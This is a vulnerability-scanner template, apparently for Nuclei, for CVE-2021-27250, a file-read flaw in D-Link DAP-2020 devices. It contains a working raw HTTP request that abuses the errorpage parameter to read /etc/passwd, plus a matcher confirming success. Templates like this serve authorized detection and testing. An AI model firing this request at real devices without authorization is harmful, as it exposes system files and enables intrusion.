id: cve-2021-27250
info:
  name: D-Link DAP-2020 File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    D-Link DAP-2020 File Read vulnerability allows an attacker to read arbitrary files, potentially leaking sensitive data. The vulnerability exploits the `errorpage` parameter in the `/cgi-bin/webproc` endpoint.
  reference:
    - https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201
    - http://www.dlink.com
  classification:
    cvss-score: 7.5
    cve-id: CVE-2021-27250
  tags: file-read

variables:
  file_path: "/etc/passwd"

http:
  - raw:
      - |
        POST /cgi-bin/webproc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        getpage=html/index.html&errorpage={{file_path}}&var:menu=setup&var:page=wizard&var:login=true&obj-action=auth&:username=admin&:password=test&:action=login&:sessionid=365dfaef
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:x:0:0"
        part: body
